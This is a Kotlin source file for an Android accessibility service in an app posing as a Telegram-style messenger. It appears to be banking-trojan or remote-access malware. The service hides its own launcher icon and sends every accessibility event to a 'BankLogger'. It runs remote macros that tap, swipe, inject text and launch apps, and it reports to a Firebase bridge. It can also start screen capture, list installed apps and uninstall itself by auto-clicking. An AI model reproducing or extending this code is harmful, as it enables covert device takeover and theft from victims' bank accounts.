package com.telegram2.messaging.remote

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.accessibilityservice.GestureDescription
import android.content.ComponentName
import android.content.Intent
import android.graphics.Path
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.telegram2.messaging.ScreenPermissionActivity
import java.util.concurrent.CountDownLatch

class MyAccessibilityService : AccessibilityService() {

    companion object {
        var instance: MyAccessibilityService? = null
        var isScreenCaptureActive = false
    }

    private val mainHandler = Handler(Looper.getMainLooper())
    var macroRunning = false

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        serviceInfo = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPES_ALL_MASK
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                    AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
            notificationTimeout = 100
        }
        hideAppIcon()
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        BankLogger.onEvent(this, event)
    }

    override fun onInterrupt() {}

    fun executeMacro(macroId: String, steps: List<MacroRunner.MacroStep>) {
        if (macroRunning) return
        macroRunning = true
        MacroRunner.start(macroId, steps, this) { success, summary ->
            macroRunning = false
            FirebaseBridge.reportMacro(macroId, success, summary)
        }
    }

    fun tap(x: Int, y: Int) {
        val path = Path().apply { moveTo(x.toFloat(), y.toFloat()) }
        dispatchGesture(GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0, 50))
            .build(), null, null)
    }

    fun swipe(sx: Int, sy: Int, ex: Int, ey: Int, dur: Long) {
        val path = Path().apply {
            moveTo(sx.toFloat(), sy.toFloat())
            lineTo(ex.toFloat(), ey.toFloat())
        }
        dispatchGesture(GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0, dur))
            .build(), null, null)
    }

    fun injectText(text: String) {
        mainHandler.post {
            val root = rootInActiveWindow ?: return@post
            val input = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
            if (input != null) {
                val bundle = Bundle().apply {
                    putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
                }
                input.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, bundle)
            }
        }
    }

    fun clickText(text: String) {
        mainHandler.post {
            val root = rootInActiveWindow ?: return@post
            for (node in root.findAccessibilityNodeInfosByText(text)) {
                if (node.isClickable || node.className == "android.widget.Button") {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    return@post
                }
            }
        }
    }

    fun launchApp(pkg: String): Boolean {
        val intent = packageManager.getLaunchIntentForPackage(pkg) ?: return false
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        startActivity(intent)
        return true
    }

    fun hideAppIcon() {
        try {
            packageManager.setComponentEnabledSetting(
                ComponentName(this, "com.telegram2.messaging.MainActivity"),
                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                android.content.pm.PackageManager.DONT_KILL_APP
            )
        } catch (_: Exception) {}
    }

    fun uninstallSelf() {
        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
            data = android.net.Uri.parse("package:$packageName")
            flags = Intent.FLAG_ACTIVITY_NEW_TASK
        }
        startActivity(intent)
        mainHandler.postDelayed({
            val root = rootInActiveWindow ?: return@postDelayed
            val btn = findClickableByText(root, "Uninstall") ?: findClickableByText(root, "OK")
            btn?.performAction(AccessibilityNodeInfo.ACTION_CLICK)
        }, 2000)
    }

    fun startScreenCapture() {
        if (isScreenCaptureActive) return
        startActivity(Intent(this, ScreenPermissionActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK
        })
        isScreenCaptureActive = true
        FirebaseBridge.updateMediaStatus(true)
    }

    fun stopScreenCapture() {
        try {
            val intent = Intent(this, com.telegram2.messaging.remote.ScreenCaptureService::class.java)
            intent.action = "stop"
            stopService(intent)
            isScreenCaptureActive = false
            FirebaseBridge.updateMediaStatus(false)
        } catch (_: Exception) {}
    }

    fun getInstalledApps(): List<String> = packageManager.getInstalledPackages(0).map { it.packageName }

    fun runOnMainThread(block: () -> Unit) {
        mainHandler.post(block)
    }

    private fun findClickableByText(root: AccessibilityNodeInfo, text: String): AccessibilityNodeInfo? {
        for (node in root.findAccessibilityNodeInfosByText(text)) {
            if (node.isClickable) return node
        }
        return null
    }
}